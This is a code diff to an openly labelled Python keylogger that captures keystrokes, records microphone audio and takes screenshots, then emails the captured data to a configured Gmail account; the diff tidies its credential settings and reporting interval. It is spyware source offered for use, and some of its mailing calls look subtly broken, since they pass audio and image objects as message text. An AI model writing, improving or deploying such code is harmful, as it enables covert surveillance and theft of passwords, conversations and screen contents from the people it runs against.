@@ -10,6 +10,9 @@ import sounddevice as sd
 from pynput import keyboard
 from pynput.keyboard import Listener
 
+EMAIL_ADDRESS = "YOU_EMAIL"
+EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
+SEND_REPORT_EVERY = 60 # as in seconds
 
 class KeyLogger:
     def __init__(self, time_interval, email, password):
@@ -47,7 +50,7 @@ class KeyLogger:
         self.appendlog(current_key)
 
     def send_mail(self, email, password, message):
-        server = smtplib.SMTP('smtp.gmail.com', 587, message.encode("utf8"))
+        server = smtplib.SMTP(host='smtp.gmail.com', port=587)
         server.starttls()
         server.login(email, password)
         server.sendmail(email, email, message)
@@ -73,7 +76,7 @@ class KeyLogger:
 
     def microphone(self):
         fs = 44100
-        seconds = 10
+        seconds = SEND_REPORT_EVERY
         obj = wave.open('sound.wav', 'w')
         obj.setnchannels(1)  # mono
         obj.setsampwidth(2)
@@ -82,11 +85,11 @@ class KeyLogger:
         obj.writeframesraw(myrecording)
         sd.wait()
 
-        self.send_mail(email="MAIL", password="PASSWORD", message=obj)
+        self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
 
     def screenshot(self):
         img = pyscreenshot.grab()
-        self.send_mail(email="MAIL", password="PASSWORD", message=img)
+        self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
 
     def run(self):
         keyboard_listener = keyboard.Listener(on_press=self.save_data)
@@ -116,9 +119,6 @@ class KeyLogger:
             except OSError:
                 print('File is close.')
 
-
-email_address = "YOUR MAIL"
-password = "YOUR PASSWORD"
-
-keylogger = KeyLogger(10, email_address, password)
+keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
 keylogger.run()
+
